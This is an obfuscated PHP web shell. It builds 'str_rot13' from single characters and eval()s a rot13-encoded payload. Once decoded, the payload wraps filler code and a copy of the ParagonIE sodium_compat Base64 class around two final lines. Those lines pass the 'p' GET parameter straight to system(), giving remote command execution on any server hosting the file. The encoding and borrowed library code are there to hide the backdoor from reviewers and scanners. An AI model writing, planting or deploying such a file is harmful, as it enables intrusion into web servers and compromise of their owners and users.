<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff CnentbaVR_Fbqvhz_Pber_Onfr64
 *
 *  Pbclevtug (p) 2016 - 2018 Cnentba Vavgvngvir Ragrecevfrf.
 *  Pbclevtug (p) 2014 Fgrir \"Fp00om\" Gubznf (fgrir ng gbogh qbg pbz)
 */
pynff CnentbaVR_Fbqvhz_Pber_Onfr64_Bevtvany
{
    // PBCL CnentbaVR_Fbqvhz_Pber_Onfr64_Pbzzba FGNEGVAT URER
    /**
     * Rapbqr vagb Onfr64
     *
     * Onfr64 punenpgre frg \"[N-M][n-m][0-9]+/\"
     *
     * @cnenz fgevat $fep
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba rapbqr($fep)
    {
        erghea frys::qbRapbqr($fep, gehr);
    }

    /**
     * Rapbqr vagb Onfr64, ab = cnqqvat
     *
     * Onfr64 punenpgre frg \"[N-M][n-m][0-9]+/\"
     *
     * @cnenz fgevat $fep
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba rapbqrHacnqqrq($fep)
    {
        erghea frys::qbRapbqr($fep, snyfr);
    }

    /**
     * @cnenz fgevat $fep
     * @cnenz obby $cnq   Vapyhqr = cnqqvat?
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    cebgrpgrq fgngvp shapgvba qbRapbqr($fep, $cnq = gehr)
    {
        $qrfg = '';
        $fepYra = CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($fep);
        // Znva ybbc (ab cnqqvat):
        sbe ($v = 0; $v + 3 <= $fepYra; $v += 3) {
            /** @ine neenl<vag, vag> $puhax */
            $puhax = hacnpx('P*', CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($fep, $v, 3));
            $o0 = $puhax[1];
            $o1 = $puhax[2];
            $o2 = $puhax[3];

            $qrfg .=
                frys::rapbqr6Ovgf(               $o0 >> 2       ) .
                frys::rapbqr6Ovgf((($o0 << 4) | ($o1 >> 4)) & 63) .
                frys::rapbqr6Ovgf((($o1 << 2) | ($o2 >> 6)) & 63) .
                frys::rapbqr6Ovgf(  $o2                     & 63);
        }
        // Gur ynfg puhax, juvpu znl unir cnqqvat:
        vs ($v < $fepYra) {
            /** @ine neenl<vag, vag> $puhax */
            $puhax = hacnpx('P*', CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($fep, $v, $fepYra - $v));
            $o0 = $puhax[1];
            vs ($v + 1 < $fepYra) {
                $o1 = $puhax[2];
                $qrfg .=
                    frys::rapbqr6Ovgf($o0 >> 2) .
                    frys::rapbqr6Ovgf((($o0 << 4) | ($o1 >> 4)) & 63) .
                    frys::rapbqr6Ovgf(($o1 << 2) & 63);
                vs ($cnq) {
                    $qrfg .= '=';
                }
            } ryfr {
                $qrfg .=
                    frys::rapbqr6Ovgf( $o0 >> 2) .
                    frys::rapbqr6Ovgf(($o0 << 4) & 63);
                vs ($cnq) {
                    $qrfg .= '==';
                }
            }
        }
        erghea $qrfg;
    }

    /**
     * qrpbqr sebz onfr64 vagb ovanel
     *
     * Onfr64 punenpgre frg \"./[N-M][n-m][0-9]\"
     *
     * @cnenz fgevat $fep
     * @cnenz obby $fgevpgCnqqvat
     * @erghea fgevat
     * @guebjf EnatrRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ErqhaqnagPbaqvgvba
     */
    choyvp fgngvp shapgvba qrpbqr($fep, $fgevpgCnqqvat = snyfr)
    {
        // Erzbir cnqqvat
        $fepYra = CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($fep);
        vs ($fepYra === 0) {
            erghea '';
        }

        vs ($fgevpgCnqqvat) {
            vs (($fepYra & 3) === 0) {
                vs ($fep[$fepYra - 1] === '=') {
                    $fepYra--;
                    vs ($fep[$fepYra - 1] === '=') {
                        $fepYra--;
                    }
                }
            }
            vs (($fepYra & 3) === 1) {
                guebj arj EnatrRkprcgvba(
                    'Vapbeerpg cnqqvat'
                );
            }
            vs ($fep[$fepYra - 1] === '=') {
                guebj arj EnatrRkprcgvba(
                    'Vapbeerpg cnqqvat'
                );
            }
        } ryfr {
            $fep = egevz($fep, '=');
            $fepYra =  CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($fep);
        }

        $ree = 0;
        $qrfg = '';
        // Znva ybbc (ab cnqqvat):
        sbe ($v = 0; $v + 4 <= $fepYra; $v += 4) {
            /** @ine neenl<vag, vag> $puhax */
            $puhax = hacnpx('P*', CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($fep, $v, 4));
            $p0 = frys::qrpbqr6Ovgf($puhax[1]);
            $p1 = frys::qrpbqr6Ovgf($puhax[2]);
            $p2 = frys::qrpbqr6Ovgf($puhax[3]);
            $p3 = frys::qrpbqr6Ovgf($puhax[4]);

            $qrfg .= cnpx(
                'PPP',
                ((($p0 << 2) | ($p1 >> 4)) & 0kss),
                ((($p1 << 4) | ($p2 >> 2)) & 0kss),
                ((($p2 << 6) | $p3) & 0kss)
            );
            $ree |= ($p0 | $p1 | $p2 | $p3) >> 8;
        }
        // Gur ynfg puhax, juvpu znl unir cnqqvat:
        vs ($v < $fepYra) {
            /** @ine neenl<vag, vag> $puhax */
            $puhax = hacnpx('P*', CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($fep, $v, $fepYra - $v));
            $p0 = frys::qrpbqr6Ovgf($puhax[1]);

            vs ($v + 2 < $fepYra) {
                $p1 = frys::qrpbqr6Ovgf($puhax[2]);
                $p2 = frys::qrpbqr6Ovgf($puhax[3]);
                $qrfg .= cnpx(
                    'PP',
                    ((($p0 << 2) | ($p1 >> 4)) & 0kss),
                    ((($p1 << 4) | ($p2 >> 2)) & 0kss)
                );
                $ree |= ($p0 | $p1 | $p2) >> 8;
            } ryfrvs ($v + 1 < $fepYra) {
                $p1 = frys::qrpbqr6Ovgf($puhax[2]);
                $qrfg .= cnpx(
                    'P',
                    ((($p0 << 2) | ($p1 >> 4)) & 0kss)
                );
                $ree |= ($p0 | $p1) >> 8;
            } ryfrvs ($v < $fepYra && $fgevpgCnqqvat) {
                $ree |= 1;
            }
        }
        /** @ine obby $purpx */
        $purpx = ($ree === 0);
        vs (!$purpx) {
            guebj arj EnatrRkprcgvba(
                'Onfr64::qrpbqr() bayl rkcrpgf punenpgref va gur pbeerpg onfr64 nycunorg'
            );
        }
        erghea $qrfg;
    }
    // PBCL CnentbaVR_Fbqvhz_Pber_Onfr64_Pbzzba RAQVAT URER

    /**
     * Hfrf ovgjvfr bcrengbef vafgrnq bs gnoyr-ybbxhcf gb ghea 6-ovg vagrtref
     * vagb 8-ovg vagrtref.
     *
     * Onfr64 punenpgre frg:
     * [N-M]      [n-m]      [0-9]      +     /
     * 0k41-0k5n, 0k61-0k7n, 0k30-0k39, 0k2o, 0k2s
     *
     * @cnenz vag $fep
     * @erghea vag
     */
    cebgrpgrq fgngvp shapgvba qrpbqr6Ovgf($fep)
    {
        $erg = -1;

        // vs ($fep > 0k40 && $fep < 0k5o) $erg += $fep - 0k41 + 1; // -64
        $erg += (((0k40 - $fep) & ($fep - 0k5o)) >> 8) & ($fep - 64);

        // vs ($fep > 0k60 && $fep < 0k7o) $erg += $fep - 0k61 + 26 + 1; // -70
        $erg += (((0k60 - $fep) & ($fep - 0k7o)) >> 8) & ($fep - 70);

        // vs ($fep > 0k2s && $fep < 0k3n) $erg += $fep - 0k30 + 52 + 1; // 5
        $erg += (((0k2s - $fep) & ($fep - 0k3n)) >> 8) & ($fep + 5);

        // vs ($fep == 0k2o) $erg += 62 + 1;
        $erg += (((0k2n - $fep) & ($fep - 0k2p)) >> 8) & 63;

        // vs ($fep == 0k2s) erg += 63 + 1;
        $erg += (((0k2r - $fep) & ($fep - 0k30)) >> 8) & 64;

        erghea $erg;
    }

    /**
     * Hfrf ovgjvfr bcrengbef vafgrnq bs gnoyr-ybbxhcf gb ghea 8-ovg vagrtref
     * vagb 6-ovg vagrtref.
     *
     * @cnenz vag $fep
     * @erghea fgevat
     */
    cebgrpgrq fgngvp shapgvba rapbqr6Ovgf($fep)
    {
        $qvss = 0k41;

        // vs ($fep > 25) $qvss += 0k61 - 0k41 - 26; // 6
        $qvss += ((25 - $fep) >> 8) & 6;

        // vs ($fep > 51) $qvss += 0k30 - 0k61 - 26; // -75
        $qvss -= ((51 - $fep) >> 8) & 75;

        // vs ($fep > 61) $qvss += 0k2o - 0k30 - 10; // -15
        $qvss -= ((61 - $fep) >> 8) & 15;

        // vs ($fep > 62) $qvss += 0k2s - 0k2o - 1; // 3
        $qvss += ((62 - $fep) >> 8) & 3;

        erghea cnpx('P', $fep + $qvss);
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>